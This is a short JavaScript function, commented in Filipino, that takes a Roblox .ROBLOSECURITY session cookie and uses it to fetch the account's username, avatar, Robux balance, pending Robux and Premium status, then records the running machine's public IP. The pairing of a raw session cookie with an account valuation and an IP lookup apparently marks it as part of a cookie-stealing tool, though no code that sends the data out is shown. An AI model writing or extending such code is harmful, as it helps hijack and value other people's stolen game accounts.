async function getAccountInfo(cookie) {
    let data = {
        username: "Unknown",
        userid: "0",
        robux: "0",
        pending: "0",
        premium: "False",
        ip: "127.0.0.1",
        image: "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-Placeholder/Png/NoAvatar/420/420/AvatarHeadshot/Png/isCircular"
    };

    try {
        // 1. GET USER INFO
        let res = await fetch("https://users.roblox.com/v1/users/authenticated", {
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });

        if(res.ok) {
            let user = await res.json();
            data.username = user.name;
            data.userid = user.id;

            // GET AVATAR
            let imgRes = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${user.id}&size=420x420&format=Png`);
            let imgData = await imgRes.json();
            data.image = imgData.data[0].imageUrl;
        }

        // 2. GET ROBUX
        let rbx = await fetch("https://economy.roblox.com/v1/users/currency", {
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });
        let rbxData = await rbx.json();
        data.robux = rbxData.robux || 0;

        // 3. GET PENDING
        let pen = await fetch("https://economy.roblox.com/v1/users/pending-currency", {
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });
        let penData = await pen.json();
        data.pending = penData.pendingCurrency || 0;

        // 4. GET PREMIUM
        let prem = await fetch(`https://premiumfeatures.roblox.com/v1/users/${data.userid}/membership`, {
            headers: { "Cookie": ".ROBLOSECURITY=" + cookie }
        });
        let premData = await prem.json();
        data.premium = premData.isPremium ? "True" : "False";

        // 5. GET IP
        let ipRes = await fetch("https://api.ipify.org?format=json");
        let ipData = await ipRes.json();
        data.ip = ipData.ip;

    } catch (e) {
        // Kung error, mo gamit lang sa default
    }

    return data;
}
